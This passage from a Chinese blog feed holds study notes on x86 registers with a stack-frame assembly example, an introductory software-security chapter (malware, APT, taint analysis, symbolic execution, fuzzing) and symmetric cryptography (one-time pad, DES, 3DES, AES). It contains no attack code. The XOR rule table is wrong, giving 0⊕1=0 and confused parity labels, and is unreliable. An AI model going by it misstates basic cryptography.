AC：对齐检测标志&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ VIF：虚拟中断标志，是 IF 标志的一个虚拟映像，与 VIP 标志一起使用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ VIP：虚拟中断等待标志，置 1 表示有一个等待处理的中断，置 0 表示没有等待处理的中断&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ ID：识别标志，置 1 表示支持 CPUID 指令，置 0 表示不支持 段寄存器：代码段寄存器 CS，数据段寄存器 DS，堆栈段寄存器 SS，附加段寄存器 ES、FS、GS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ 实模式下段寄存器通常与指针寄存器（如ESP、EDI、ESI等）联合使用 控制寄存器：CR0、CR1、CR2、CR3、CR4，用于记录处理器的运行模式和当前执行任务的属性 4.常用寄存器的说明 &nbsp;&nbsp;&nbsp;&nbsp;寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;说明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EAX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended Accumulator X 累加寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A代表Accumulator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended Counting X 计数寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C代表counting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EDI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended Destination Indexing 目的索引寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D代表destnation，I代表Indexing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ESI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended Source Indexing 源索引寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S代表Source，I代表Indexing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ESP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended Stack Pointer 栈指针寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S代表Stack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EBP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended (Stack) Base Pointer 栈基指针寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;B代表Base&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EIP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extended Instructions Pointer 指令寄存器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I代表Instruction 5.有关寄存器的代码 下面的代码很具有参考价值1234567891011121314void SomeProcedure (int anArgument)&#123; int aVariable; aVariable = anArgument;&#125;SomeProcedure: PUSH EBP ;save original value of EBP on stack MOV EBP,ESP ;store top of stack address in EBP SUB ESP,4 ;allocate space for aVariable on stack MOV EAX,[EBP+8] ;fetch anArgument into EAX, which is ;8 bytes below the stored top of stack MOV [EBP-4],EAX ;4 bytes above the stored top of stack MOV ESP,EBP ;free space allocated for aVariable POP EBP ;restore original value of EBP RET ;return to the caller]]></content>
      <tags>
        <tag>《软件安全分析与应用》</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《软件安全分析与应用》第 1 章：绪论学习笔记]]></title>
    <url>%2F2019%2F07%2F12%2F2019.07.12%EF%BC%8870%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天开始着手为研究生的学习生涯打基础，这一个月我将会回顾有关计算机专业的最基础的知识点，并将缺下的东西补上，主要内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ C 语言、数据结构、C++、汇编语言等&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 实验室的测试内容&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 每月必读的书籍&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这两天给我最大的感触就是“自己欠缺的东西太多了”，要想比别人的技术厉害，就要比别人付出更多的努力！必须要严格要求自己！必须要比别人花更多的时间！必须要为自己的梦想坚持下去！拼个 3 年！！ 一、典型的安全问题 1、恶意软件 传统恶意软件一直发展的 3 个方面：渗透与扩散能力、隐蔽能力、破坏能力 恶意软件的发展历程：单机传播阶段、网络传播阶段、协同攻击阶段（分布式拒绝服务攻击、多连接跳转攻击） 2.APT(Advanced Persistent Threat)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;高可持续性威胁，RSA 和 Hacking Team 都遭受了 APT 攻击3.Hacking Team 遭受 APT 攻击 各种零日漏洞和相关漏洞利用代码 远程控制平台 Fuzz 测试系统 恶意代码监测系统 4.软件漏洞&nbsp;&nbsp;&nbsp;&nbsp;① 消除软件漏洞很难的原因 软件自身越来越复杂 软件漏洞越来越多样化 软件开发周期越来越短 &nbsp;&nbsp;&nbsp;&nbsp;② JPEG 漏洞&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JPEG 格式：文件头为 2B 的起始标志（FFD8），文件尾部为 2B 的结束标志（FFD9），中间数据由子结构组成（2B 标志码 + 2B 的长度域（大端格式） + 信息数据）5.软件后门&nbsp;&nbsp;&nbsp;&nbsp;将软件后门设计为软件漏洞的形式，对于攻击者有如下优势： 难发现 易利用 难取证 二、软件安全性分析的目标 1.软件安全性分析一般要回答以下三方面的问题： 存在问题 机理问题 对策问题 2.对软件的逆向分析存在以下挑战 指令代码的理解 关联关系的抽取 复杂逻辑的解析 三、主要方法与技术 1.按照软件逆向分析方式的不同，将软件逆向分析分为静态和动态两大类 静态分析：主要直接对软件的可执行代码进行分析，一般是在对代码反编译或反汇编的基础上，对汇编代码或其他高级语言代码进行进一步的分析 动态分析：动态分析是通过直接运行软件，然后监测软件运行过程，实施分析 当前的主流分析思路：以动态分析为主，一方面利用模糊测试等技术构造执行的不同路径，另一方面也利用静态分析手段弥补动态分析过程中的不足，优化和提升动态分析的能力。2.根据逆向分析获得信息的层次不同，又可以将软件逆向分析方法与技术分为： 获取代码的反汇编、反编译等 程序依赖关系分析的程序切片、污点传播分析、符号执行等； 3.程序调试的优缺点① 优点 避免用户对指令复杂推理过程 直接对每条指令的执行结果 进行分析 ② 缺点 全面性较差（动态分析的共性缺陷） 软件自保技术的应用可能阻碍调试 调试仅能提供动态的细节信息，对用户而言，分析、理解难度仍很大 4.程序切片&nbsp;&nbsp;&nbsp;&nbsp;程序切片是当前用于局部代码片段分析的一种重要手段，但仍不太适合大规模代码的分析5.污点传播分析&nbsp;&nbsp;&nbsp;&nbsp;① 基本思想：将所感兴趣的数据做标记（如同染色一样），即标记为污点数据，然后通过分析对该污点数据的处理过程，根据每条指令的污点传播规则，分析数据的传递关系。&nbsp;&nbsp;&nbsp;&nbsp;② 污点传播分析一般采取动态的分析方式；&nbsp;&nbsp;&nbsp;&nbsp;③ 动态污点传播分析有很多方式，主要的差异：如何获得动态执行过程中具体每一条指令和指令执行前后状态，当前主要的实现方式有“基于插桩”、“基于硬件”、“基于编译器扩展” 和 “基于硬件模拟器”等实现方法6.符号执行&nbsp;&nbsp;&nbsp;&nbsp;其基本思想是将目标程序代码中部分变量和运算符号化，通过对各种条件分支的符号化表达来形成路径的约束条件。&nbsp;&nbsp;&nbsp;&nbsp;符号执行同样是一种数据流分析方法，其基本思想是：用符号变量作为输入参数，对程序进行模拟执行，然后对程序的执行路径进行分析，并提取路径中的约束条件，通过对约束进行求解实现对程序安全性及路径可达性等分析。7.模糊测试&nbsp;&nbsp;&nbsp;&nbsp;① 准确来说模糊测试并不是一项逆向分析技术，他最初的应用主要是为了通过构造各种畸形的数据输入来测试软件实现的正确性&nbsp;&nbsp;&nbsp;&nbsp;②主要用途：尽可能多地触发软件的各种执行路径，弥补了软件动态逆向分析的缺陷&nbsp;&nbsp;&nbsp;&nbsp;③基本思想：通过构造各种不同的输入数据，尽可能地触发执行软件的各种路径，通过对执行结果的健侧来实现相关的分析或检测目标。&nbsp;&nbsp;&nbsp;&nbsp;④研究重点：如何提高测试数据生成的针对性，从而提高模糊测试效率 三、主要分析应用 1.恶意软件分析2.网络协议逆向分析&nbsp;&nbsp;&nbsp;&nbsp;① 协议逆向分析的方法 基于网络流量统计特征展开分析 直接通过逆向软件进行分析(准确性更高、分析能力更强) 基于软件逆向分析：结合协议实现代码的静态、动态逆向分析，提取网络协议中的数据包格式、关键字、协议状态机等信息 3.软件漏洞分析与利用&nbsp;&nbsp;&nbsp;&nbsp;对于发现软件漏洞唯一的技术手段就是：软件逆向分析]]></content>
      <tags>
        <tag>《软件安全分析与应用》</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第三章（对称密码）学习笔记]]></title>
    <url>%2F2019%2F06%2F16%2F2019.06.16%EF%BC%8869%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天主要回顾的内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 比特序列运算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ XOR 运算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 对称密码算法：DES、三重DES、AES 一、从文字密码到比特序列密码 1.什么是编码？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将现实世界中的东西映射为比特序列的操作成为编码，比特序列是由 0 和 1 排列而成的。2.XOR：异或运算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;异或运算的运算规则如下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0（偶数）⊕ 0（偶数）= 0（偶数）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0（偶数）⊕ 1（奇数）= 0（奇数）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0（奇数）⊕ 0（偶数）= 0（奇数）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0（奇数）⊕ 0（奇数）= 0（偶数）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于上文的运算规则需要注意的是：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 和加法运算不同的是，XOR 中不需要进位；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 两个相同的数进行 XOR 运算的结果一定为 0；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 可以通过XOR运算规则，进行加密和解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 将明文 A 用密钥 B 进行加密，得到密文 A ⊕ B；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 将密文 A ⊕ B 用密钥 B 进行解密，得到明文 A； 二、一次性密码本（绝对不会被破译的密码） 1.一次性密码本的加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;它加密的原理在于将明文与一串随机的比特序列进行 XOR 运算现举一个有关一次性密码本加密的例子：将明文 mid 通过一次性密码本进行加密：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 对 “mid” 字符串通过 ASCII 进行编码并产生下面的一串比特序列：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;m&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01101101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01101001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01100100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 产生一个 24 位的随机数（具有不可重现性），如下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11010001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11010010&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11011000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 将明文和密钥的比特序列进行 XOR 运算，得到一串新的比特序列，也就是 mid 所对应的密文，如下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01101101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01101001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01100100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⊕ 11010001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11010010&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11011000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;————————————————————————&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10111100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10111011&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10111100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;则 mid 通过一次性密码得到的密文为：101111001011101110111100 2.一次性密码本的解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一次性密码本的解密就是加密的反向运算，也就是密文 ⊕ 一次性密码 = 明文3.一次性密码本是无法破译的？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 这里说的无法破译，并不是指在显示时间内难以破译，而是指即便拥有一种运算能力无穷大的计算机，可以在一瞬间遍历任意大小的密钥空间，而依然无法破解。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 之所以说一次性密码本是无法破解的，是因为即便能够解密出 mid 这个字符串，但是也无法判断它是否是正确的明文。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 一次性密码本是无条件安全的，在理论上是无法破译的。4.一次性密码本为什么没有被使用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⛟ 密钥的配送&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⛟ 密钥的保存&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⛟ 密钥的重用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⛟ 密钥的同步：发送者和接收者的密钥比特序列不允许有任何错位，否则错位的比特后的所有信息都将无法解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⛟ 密钥的生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;综上所述，一次性密码本是一种几乎没有实用性的密码，但一次性密码本却孕育了流密码，流密码使用的不是真正的随机比特序列，而是伪随机数生成器产生的比特序列。 三、DES **1.什么是DES？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DES（Data Encryption Standard）是 1977 年美国联邦信息处理标准（FIPS）中所采用的一种对称密码（FIPS 46-3） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于DES在较短时间内能够被破译，现在已经不实用DES进行加密了。 **2.DES 的加密和解密** ![](http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/4tMZwPSU3WOXSkokb0KkQqajAzQT8wiWjYOeEhzAxfg!/r/dLgAAAAAAAAA) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DES 是一种将 64 比特的明文加密成 64 位比特的密文的对称密码算法，它的密钥长度是 **64** 比特，但由于每隔 **7 比特**会设置一个用于错误检验的比特，因此实质上其密钥长度是 **56 比特**。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DES 是以 **64 比特**的明文（比特序列）为一个单位来进行加密的，这个 64 比特的单位**称为分组**。以分组为单位进行处理的密码算法称为**密码算法** **3.DES 的结构—Feistel 网络** ![](http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/8I3sQ6RmRhsosqKyzK5Yktn*MsycyBgLWPjEu6hF3w0!/r/dLgAAAAAAAAA) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① Feistel 网络/结构/密码不仅被用于 DES，在其他很多密码算法中也有应用； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② Feistel 网络中，加密的各个步骤称为**轮**，整个加密过程中就是进行若干次轮的循环，一共有 **16轮**； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ **轮函数**的作用根据 “右侧” 和字密钥生成对 “左侧” 进行加密的比特序列，它是密码系统的**核心**； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ Feistel 网络一轮的具体**计算步骤**如下： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 将输入的数据等分为左右两部分； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 将输入的右侧直接发送到输出的右侧； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 将输入的右侧发送到轮函数； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 轮函数根据右侧数据和子密钥，计算出一串看上去是随机的比特序列； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 将上一步得到的比特序列与左侧数据进行 XOR 运算，并将结果作为加密后的左侧； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ Feistel 网络的**解密操作**只需要按照相反的顺序来使用子密钥就可以完成了； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥ Feistel 网络的**轮数可以任意增加**； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑦ **加密时无论使用任何函数作为轮函数都可以正确解密；** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑧ **加密和解密可以用完全相同的结构来实现** **4.差分分析与线性分析** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**① 差分分析**是一种针对分组密码的分析方法，其思路是“**改变一部分明文并分析密文如何随之改变**” &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**② 线性分析**的思路是“**将明文和密文的一些对应比特进行 XOR 并计算其结果为零的概率**” 三、三重DES 1.什么是三重 DES？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;三重DES是为了增加 DES 的强度，将 DES 重复 3 次所得到一种密码算法，缩写为3DES 2.三重 DES 的加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;三重 DES 是加密 → 解密 → 加密的过程，目的是为了让三重 DES 能够兼容普通的 DES（当三重 DES 中所有的密钥都相同时，三重 DES 也就是普通的 DES了），也就是说三重 DES 对 DES 具备向下兼容性；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 如果密钥 1 和密钥 3 使用相同的密钥，而密钥 2 使用不同的密钥，这种三重 DES 称为DES-EDE2；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 如果密钥 1 、密钥 2、密钥 3 全部使用不同的比特序列的三重 DES 称为DES-EDE33.三重 DES 的解密 四、AES的选定过程 1.什么是 AES？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;AES（Advanced Encryption Standard是取代其前任标准（DES）而成为新标准的一种对称密码算法。 五、Rijndael 1.什么是 Rijndael？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① Rijndael 是一个分组密码算法，在 2000 年被选为新一代的标准密码算法——AES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② Rijndael 的分组长度和密码长度可以分别为 32 比特为单位在 128 比特到 256比特 的范围内进行选择；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ AES 的分组长度固定为 128比特，密码长度只有 128、192 和 256 比特三种；2.Rijndael 的加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① Rijndael 没有使用 Feistel 网络，而是使用了 SPN 